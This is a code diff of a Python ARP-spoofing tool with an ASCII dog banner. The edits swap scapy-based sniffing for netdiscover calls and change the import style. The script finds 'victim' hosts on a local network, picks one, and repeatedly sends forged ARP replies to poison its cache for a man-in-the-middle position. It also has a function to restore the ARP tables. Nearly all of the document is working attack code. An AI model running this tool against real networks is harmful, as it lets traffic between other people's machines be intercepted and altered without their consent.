@@ -1,4 +1,13 @@
 #!/usr/bin/env python3
+import os
+import sys
+import time
+import argparse
+import logging
+import socket
+import subprocess
+from scapy.all import *
+
 doggy = """
     __    __
     \/----\/
@@ -9,13 +18,6 @@ doggy = """
  _| | |  | | |_
 "---|_|--|_|---"
 """
-import os
-import sys
-import time
-import argparse
-import logging
-import socket
-import scapy.all as scapy
 
 def setup_logging(verbose=False, log_file=None):
     level = logging.DEBUG if verbose else logging.INFO
@@ -34,23 +36,32 @@ def validate_ip(ip):
 
 def get_local_ip():
     try:
-        return scapy.get_if_addr()
-    except OSError:
+        return subprocess.check_output(['hostname', '-I']).decode().split()[0]
+    except Exception:
         logging.error("Failed to fetch the local IP address")
         sys.exit(1)
 
 def sniff_packets(interface, count=10):
     logging.info("Sniffing packets on interface %s...", interface)
-    packets = scapy.sniff(iface=interface, count=count)
-    return packets
+    try:
+        result = subprocess.run(['netdiscover', '-i', interface, '-c', str(count), '-P'], capture_output=True, text=True)
+        if result.returncode == 0:
+            return result.stdout.splitlines()
+        else:
+            logging.error("Failed to sniff packets using netdiscover")
+            return []
+    except Exception as e:
+        logging.error("An error occurred while sniffing packets using netdiscover: %s", e)
+        return []
 
-def extract_victim_info(packets):
+def extract_victim_info(output_lines):
     victim_ips = set()
     victim_macs = set()
-    for packet in packets:
-        if scapy.ARP in packet and packet[scapy.ARP].op in (1, 2):  # ARP request or reply
-            victim_ip = packet[scapy.ARP].psrc
-            victim_mac = packet[scapy.ARP].hwsrc
+    for line in output_lines:
+        parts = line.split()
+        if len(parts) >= 3:
+            victim_ip = parts[0]
+            victim_mac = parts[1]
             victim_ips.add(victim_ip)
             victim_macs.add(victim_mac)
     return victim_ips, victim_macs
@@ -70,8 +81,8 @@ def select_victim(victim_ips, victim_macs):
     return None
 
 def get_victim_info(interface):
-    packets = sniff_packets(interface)
-    victim_ips, victim_macs = extract_victim_info(packets)
+    output_lines = sniff_packets(interface)
+    victim_ips, victim_macs = extract_victim_info(output_lines)
     victim_ip = select_victim(list(victim_ips), list(victim_macs))
     if victim_ip:
         logging.info("Selected victim IP: %s", victim_ip)
@@ -81,10 +92,10 @@ def get_victim_info(interface):
 
 def get_mac(ip):
     try:
-        arp_request = scapy.ARP(pdst=ip)
-        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request = ARP(pdst=ip)
+        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
         arp_request_broadcast = broadcast / arp_request
-        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, retry=3)[0]
+        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False, retry=3)[0]
         if answered_list:
             return answered_list[0][1].hwsrc
     except IndexError:
@@ -93,9 +104,9 @@ def get_mac(ip):
 def arp_spoof(target_ip, spoof_ip, count=100, interval=1):
     target_mac = get_mac(target_ip)
     if target_mac:
-        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
         for _ in range(count):
-            scapy.send(packet, verbose=False)
+            send(packet, verbose=False)
             logging.info("Sent a devious ARP packet to %s", target_ip)
             time.sleep(interval)
     else:
@@ -105,8 +116,8 @@ def restore_arp_tables(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     if destination_mac and source_mac:
-        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-        scapy.send(packet, count=4, verbose=False)
+        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+        send(packet, count=4, verbose=False)
         logging.info("ARP tables reset for %s", destination_ip)
     else:
         logging.error("Failed to reset ARP tables for %s", destination_ip)
@@ -177,3 +188,4 @@ if __name__ == "__main__":
     args = parser.parse_args()
     print(doggy)
     main(args)
+
